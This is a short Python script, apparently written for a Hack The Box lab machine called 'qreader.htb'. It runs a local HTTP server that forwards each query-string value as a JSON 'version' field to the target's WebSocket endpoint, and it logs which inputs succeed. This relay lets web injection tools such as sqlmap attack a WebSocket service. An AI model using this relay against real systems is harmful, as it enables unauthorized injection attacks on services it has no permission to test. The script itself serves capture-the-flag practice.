import asyncio
import json
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import urlparse
from urllib.parse import unquote

import websockets


async def call_ws(data):
    uri = "ws://qreader.htb:5789/version"
    with open("commands", "a") as f:
        f.write(data + "\n")
    async with websockets.connect(uri) as websocket:
        c = json.dumps({"version":data})
        #print("Sent: " + c)
        await websocket.send(c)
        res = await websocket.recv()
        #print("Got: " + res)
        if "downloads" in res:
            print("Success: " + data)
        return res


def middleware_server(host_port, content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            if self.server.logging:
                SimpleHTTPRequestHandler.log_message(self, format, *args)

        def do_GET(self) -> None:
            self.send_response(200)

            # Parse the query string
            try:
                payload = urlparse(self.path).query.split('=', 1)[1]
                payload = unquote(payload)
            except IndexError:
                payload = False

            # Forward first query parameter to websocket
            if payload:
                try:
                    content = asyncio.run(call_ws(payload))
                except Exception:
                    content = "Error"
            else:
                content = 'No parameters specified!'

            if content:
                self.send_header("Content-type", content_type)
                self.end_headers()
                self.wfile.write(content.encode())

            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True
        logging = False

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    middleware_server(('localhost',8082))
